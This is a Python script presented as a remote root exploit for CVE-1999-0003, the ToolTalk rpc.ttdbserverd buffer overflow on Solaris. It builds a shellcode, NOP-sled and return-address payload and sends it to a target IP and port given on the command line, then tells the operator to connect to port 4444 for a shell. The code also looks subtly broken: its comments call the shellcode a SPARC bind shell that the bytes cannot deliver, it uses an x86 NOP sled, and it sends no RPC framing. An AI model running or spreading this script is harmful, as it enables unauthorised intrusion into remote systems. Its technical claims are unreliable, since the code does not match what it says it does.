#!/usr/bin/env python3
# CVE-1999-0003 - Remote Root Exploit for ToolTalk rpc.ttdbserverd Buffer Overflow

import socket
import struct
import argparse

# Bind shell payload (SPARC shellcode for Solaris systems, port 4444)
SHELLCODE = (
    b"\x90\x1b\x80\x0e"  # xor %o7, %o7, %o0 (NOP equivalent)
    b"\x82\x10\x20\x17"  # mov 23, %g1 (syscall execve)
    b"\x91\xd0\x20\x08"  # ta 8
    b"/bin/ksh" + b"\x00" * 4  # padding
)

def build_payload():
    nop_sled = b"\x90" * 1024
    ret_addr = struct.pack(">I", 0xeffffabc)  # placeholder, depends on Solaris environment
    buffer = nop_sled + SHELLCODE + ret_addr * 64
    return buffer

def send_exploit(target_ip, target_port, payload):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target_ip, target_port))
        sock.send(payload)
        sock.close()
        print(f"[+] Exploit sent to {target_ip}:{target_port}")
        print("[+] Connect to target on port 4444 if successful")
    except Exception as e:
        print(f"[!] Exploit failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="CVE-1999-0003 - ToolTalk rpc.ttdbserverd Buffer Overflow Remote Root Exploit")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=32771, help="Target port (default: 32771)")
    args = parser.parse_args()

    payload = build_payload()
    send_exploit(args.target, args.port, payload)

if __name__ == "__main__":
    main()
